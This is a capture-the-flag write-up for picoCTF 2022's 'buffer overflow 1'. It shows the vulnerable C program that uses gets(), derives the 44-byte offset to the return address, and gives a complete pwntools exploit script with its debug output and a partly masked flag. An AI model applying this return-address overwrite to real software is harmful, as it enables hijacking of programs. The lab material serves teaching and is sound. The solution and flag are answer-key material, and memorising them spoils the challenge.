# buffer overflow 1

Tags: picoCTF 2022, Binary Exploitation

| Author | Point    |
| ------ | -------- |
| SANJAY C / PALASH OSWAL | 200 points |

## Description

Control the return address  
Now we're cooking! You can overflow the buffer and return to the flag function in the program.  
You can view source here. And connect with it using nc saturn.picoctf.net 51768  

## Solve

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

In my opinion, the flow is main() -> vuln() -> win(). If the get of vuln() overflows, processing can proceed as described above.

The distance from buf to the return address is -0x02c, which is 44 bytes.

![](<./images/CleanShot 2024-04-17 at 20.43.58.png>)

Overflow buf and overwrite return address. The offset to the return address is 44 bytes.

function win() address is 0x080491f6.

![](<./images/CleanShot 2024-04-17 at 20.48.36.png>)

So, the following is the payload:

```python
payload = b''
payload += b'A' * 44 # Junk
payload += p32(0x080491f6) # Return address
```

The full exploit code is as follows.

```python
from pwn import *

context.log_level = 'debug'

host = 'saturn.picoctf.net'
port = 62804

p = remote(host, port)

p.recvline()

payload = b''
payload += b'A' * 44 # Junk
payload += p32(0x080491f6) # Return address

p.sendline(payload)

p.recvall()
```

```bash
$ python3 exploit.py
[+] Opening connection to saturn.picoctf.net on port 62804: Done
[DEBUG] Received 0x1b bytes:
    b'Please enter your string: \n'
[DEBUG] Sent 0x31 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000020  41 41 41 41  41 41 41 41  41 41 41 41  f6 91 04 08  │AAAA│AAAA│AAAA│····│
    00000030  0a                                                  │·│
    00000031
[+] Receiving all data: Done (100B)
[DEBUG] Received 0x40 bytes:
    b'Okay, time to return... Fingers Crossed... Jumping to 0x80491f6\n'
[DEBUG] Received 0x24 bytes:
    b'picoCTF{addr3ss3s_ar3_3asy_********}'
[*] Closed connection to saturn.picoctf.net port 62804
```

## Flag

```
picoCTF{addr3ss3s_ar3_3asy_********}
```